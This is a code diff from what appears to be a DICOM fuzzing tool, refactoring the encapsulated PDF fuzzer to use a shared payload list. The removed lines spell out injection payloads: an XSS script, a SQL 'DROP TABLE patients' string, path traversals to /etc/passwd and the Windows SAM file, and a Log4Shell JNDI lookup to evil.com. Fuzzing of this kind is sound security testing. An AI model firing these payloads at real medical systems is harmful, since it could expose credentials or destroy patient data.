@@ -21,6 +21,7 @@ from pydicom.sequence import Sequence
 from dicom_fuzzer.utils.logger import get_logger
 
 from .base import FormatFuzzerBase
+from .dicom_dictionaries import INJECTION_PAYLOADS
 
 logger = get_logger(__name__)
 
@@ -36,18 +37,6 @@ _FAKE_PAYLOADS = {
     "xml": b'<?xml version="1.0"?>\n<root><exploit/></root>',
     "html": b"<html><script>alert(1)</script></html>",
 }
-
-_INJECTION_PAYLOADS = [
-    "<script>alert('xss')</script>",
-    "'; DROP TABLE patients; --",
-    "../../../etc/passwd",
-    "..\\..\\..\\windows\\system32\\config\\sam",
-    "${jndi:ldap://evil.com/a}",
-    "A" * 10000,
-    "",
-    "\x00" * 16,
-    "\n" * 500,
-]
 
 
 class EncapsulatedPdfFuzzer(FormatFuzzerBase):
@@ -214,7 +203,7 @@ class EncapsulatedPdfFuzzer(FormatFuzzerBase):
 
         try:
             if attack == "title_injection":
-                dataset.DocumentTitle = random.choice(_INJECTION_PAYLOADS)
+                dataset.DocumentTitle = random.choice(INJECTION_PAYLOADS)
             elif attack == "title_boundary":
                 dataset.DocumentTitle = random.choice(
                     [
@@ -241,7 +230,7 @@ class EncapsulatedPdfFuzzer(FormatFuzzerBase):
                         "\x00",
                     ]
                 )
-                seq_item.CodeMeaning = random.choice(_INJECTION_PAYLOADS)
+                seq_item.CodeMeaning = random.choice(INJECTION_PAYLOADS)
                 dataset.ConceptNameCodeSequence = Sequence([seq_item])
             elif attack == "concept_name_remove":
                 if "ConceptNameCodeSequence" in dataset:
